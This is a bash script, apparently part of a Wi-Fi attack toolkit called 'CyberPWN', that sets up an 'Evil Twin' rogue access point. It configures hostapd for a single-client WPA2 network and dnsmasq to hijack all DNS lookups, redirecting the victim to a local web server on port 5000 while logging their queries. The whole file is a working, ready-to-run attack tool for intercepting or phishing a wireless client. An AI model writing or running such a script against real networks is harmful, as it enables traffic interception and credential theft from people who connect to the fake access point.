#!/bin/bash
# Start Evil Twin AP: release wlan0 from NM, set 192.168.4.1, hostapd + dnsmasq.
# Usage: sudo ./PORTABLEAP.sh
# Hosts website at 192.168.4.1:5000 with DNS, single client limit

set -e
SSID="PWN"
AP_PASS="pwn123"
# Project root (parent of scripts/)
BASE="$(cd "$(dirname "$0")/.." && pwd)"
CONFIG="$BASE/evil_twin.conf"
AP_IFACE="wlan0"  # Fixed to wlan0 for AP
SCAN_IFACE="wlan1"  # Use wlan1 for scanning
AP_IP="192.168.4.1"
AP_NET="192.168.4.0/24"
DHCP_START="192.168.4.100"
DHCP_END="192.168.4.100"  # Single client - only one IP
DNSMASQ_CONF="/tmp/cyberpwn_dnsmasq_${AP_IFACE}.conf"
HOSTAPD_PID="/tmp/cyberpwn_hostapd.pid"

# Check if AP interface exists
if ! iwconfig "$AP_IFACE" >/dev/null 2>&1; then
    echo "ERROR: AP interface $AP_IFACE not found"
    exit 1
fi

echo "Using AP interface: $AP_IFACE"
echo "Scan interface available: $SCAN_IFACE"
echo "SSID: $SSID (single client allowed)"
echo "Website will be hosted at: http://$AP_IP:5000"

# 1) Write hostapd config with single client limit
cat > "$CONFIG" << EOF
# Evil Twin AP - $SSID
interface=$AP_IFACE
driver=nl80211
ssid=$SSID
channel=6
hw_mode=g
max_num_sta=1  # Single client limit
EOF

cat >> "$CONFIG" << EOF
wpa=2
wpa_passphrase=$AP_PASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# 2) Release interface from NetworkManager and reset properly
echo "Releasing $AP_IFACE from NetworkManager..."
nmcli dev set "$AP_IFACE" managed no 2>/dev/null || true
nmcli device disconnect "$AP_IFACE" 2>/dev/null || true

# Kill any conflicting processes
pkill -f "hostapd.*$AP_IFACE" 2>/dev/null || true
pkill -f "dnsmasq.*$AP_IFACE" 2>/dev/null || true

# Reset interface completely
echo "Resetting $AP_IFACE..."
ip link set "$AP_IFACE" down 2>/dev/null || true
sleep 1
ip addr flush dev "$AP_IFACE" 2>/dev/null || true
iwconfig "$AP_IFACE" mode managed 2>/dev/null || true
sleep 1
ip link set "$AP_IFACE" up 2>/dev/null || true
sleep 2

# Set IP address
ip addr add "$AP_IP/24" dev "$AP_IFACE" 2>/dev/null || true
sleep 1

# Verify interface is ready
if ! ip addr show "$AP_IFACE" | grep -q "$AP_IP"; then
    echo "ERROR: Failed to configure $AP_IFACE with IP $AP_IP"
    exit 1
fi

echo "Interface $AP_IFACE configured successfully"

# 3) dnsmasq for DHCP (single client) and DNS
cat > "$DNSMASQ_CONF" << EOF
interface=$AP_IFACE
bind-interfaces
dhcp-range=${DHCP_START},${DHCP_END},255.255.255.0,12h
dhcp-option=3,$AP_IP
dhcp-option=6,$AP_IP
# DNS hijacking - redirect all domains to our web server
address=/#/$AP_IP
# DNS server settings
server=8.8.8.8
domain-needed
bogus-priv
# Log DNS queries for monitoring
log-queries
log-dhcp
EOF
pkill -f "dnsmasq.*$DNSMASQ_CONF" 2>/dev/null || true
dnsmasq -C "$DNSMASQ_CONF" -q 2>/dev/null &

# 4) hostapd in background with fallback driver
echo "Starting hostapd..."
pkill -f "hostapd.*$CONFIG" 2>/dev/null || true
sleep 2

# Try with nl80211 driver first
if ! timeout 10 hostapd -dd "$CONFIG" 2>&1 | grep -q "interface setup ok"; then
    echo "nl80211 driver failed, trying alternative..."
    
    # Try with alternative driver
    cat > "$CONFIG" << EOF
# Evil Twin AP - $SSID (fallback driver)
interface=$AP_IFACE
driver=rtl871xdrv
ssid=$SSID
channel=6
hw_mode=g
max_num_sta=1  # Single client limit
wpa=2
wpa_passphrase=$AP_PASS
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
    
    if ! timeout 10 hostapd -dd "$CONFIG" 2>&1 | grep -q "interface setup ok"; then
        echo "ERROR: Failed to setup interface with any driver"
        echo "Available drivers:"
        hostapd --help 2>&1 | grep -A 10 "drivers:" || echo "Could not list drivers"
        exit 1
    fi
fi

# Start hostapd in background
hostapd -B -P "$HOSTAPD_PID" "$CONFIG" 2>/dev/null || {
    echo "ERROR: Failed to start hostapd in background"
    exit 1
}

# Verify hostapd is running
sleep 3
if ! pgrep -f "hostapd.*$CONFIG" >/dev/null; then
    echo "ERROR: hostapd failed to start"
    exit 1
fi

echo "hostapd started successfully"

echo ""
echo "=== AP SETUP COMPLETE ==="
echo "SSID: $SSID (WPA2)"
echo "Password: $AP_PASS"
echo "AP IP: $AP_IP"
echo "Website: http://$AP_IP:5000"
echo "Max clients: 1 (single connection)"
echo "DNS: All domains redirect to $AP_IP"
echo ""
echo "Client will be redirected to your CyberPWN website!"
echo "Use $SCAN_IFACE for network scanning"
